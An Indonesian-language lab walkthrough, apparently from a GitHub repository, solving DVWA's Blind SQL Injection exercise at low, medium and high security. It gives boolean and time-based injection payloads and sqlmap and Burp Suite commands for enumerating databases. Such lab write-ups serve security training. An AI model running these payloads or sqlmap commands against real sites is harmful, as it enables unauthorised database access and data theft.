# SQL Injection (Blind)
Blind SQL Injection muncul ketika aplikasi rentan terhadap SQL Injection, tetapi respons HTTP-nya tidak berisi hasil kueri SQL yang relevan atau detail kesalahan basis data apa pun.

## Security Low
```sh
1' and length(database())=4#
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection%20blind/sqli%20blind%201.JPG)

- Menemukan database dengan tool sqlmap
```sh
sqlmap -u "http://<IP_Server>/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=hash; security=low" --dbs
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection%20blind/sqli%20blind%202.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection%20blind/sqli%20blind%203.JPG)

## Security Medium
- Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
```sh
1 and sleep(5)
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection%20blind/sqli%20blind%204.JPG)

- Kembali ke halaman seperti semula, tangkap request pada halaman **SQL Injection (Blind)** dengan **Security Medium** menggunakan tool Burp Suite. Klik kanan pada kolom **Request** dan pilih **Save Item**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection%20blind/sqli%20blind%205.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection%20blind/sqli%20blind%206.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection%20blind/sqli%20blind%207.JPG)

- Lakukan SQL Injection pada request dengan tool sqlmap
```sh
sqlmap -r nama_file_request --dbs
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection%20blind/sqli%20blind%208.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection%20blind/sqli%20blind%209.JPG)

## Security High
```sh
sqlmap -u "http://<IP_Server>/DVWA/vulnerabilities/sqli_blind/?id=1" --cookie="PHPSESSID=hash; security=high" --dbs
```
